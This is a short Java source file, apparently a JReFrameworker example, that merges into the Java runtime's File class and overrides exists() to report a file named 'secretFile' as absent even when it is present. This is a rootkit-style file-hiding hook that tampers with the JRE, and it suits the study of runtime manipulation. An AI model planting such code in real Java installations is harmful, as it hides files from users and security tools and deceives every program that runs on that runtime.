package java.io;

import jreframeworker.annotations.methods.MergeMethod;
import jreframeworker.annotations.types.MergeType;

@MergeType
public class HiddenFile extends File {

	private static final long serialVersionUID = 1L;

	/**
	 * This method initializes a new <code>File</code> object to represent a
	 * file with the specified path.
	 *
	 * @param name The path name of the file
	 */
	public HiddenFile(String name) {
		super(name);
	}

	/**
	 * Overwrites the behavior of File.exists() to return false if
	 * the file's name is "secretFile" even if the file actually exists
	 */
	@MergeMethod
	public boolean exists() {
		if (isFile() && getName().equals("secretFile")) {
			return false;
		} else {
			return super.exists();
		}
	}

}
